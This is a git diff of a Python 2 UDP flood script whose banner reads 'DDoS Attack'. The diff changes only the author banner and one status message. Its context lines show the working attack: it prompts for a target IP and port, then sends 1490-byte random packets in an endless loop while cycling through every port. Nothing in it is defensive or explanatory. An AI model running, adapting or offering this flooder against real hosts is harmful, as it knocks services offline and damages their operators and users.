@@ -20,9 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDoS Attack")
 print
-print "Author   : LapanWasTaken"
-print "github   : https://github.com/LapanWasTaken"
-print "Email    : lapanwastaken@gmail.com"
+print "[+] Author   : LapanWasTaken"
+print "[+] github   : https://github.com/LapanWasTaken"
+print "[+] Email    : lapanwastaken@gmail.com"
+print "[~] Quote    : It is better to be hated for what you are than to be loved for what you are not."
 print
 ip = raw_input("masukkan IP : ")
 port = input("masukkan PORT       : ")
@@ -44,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
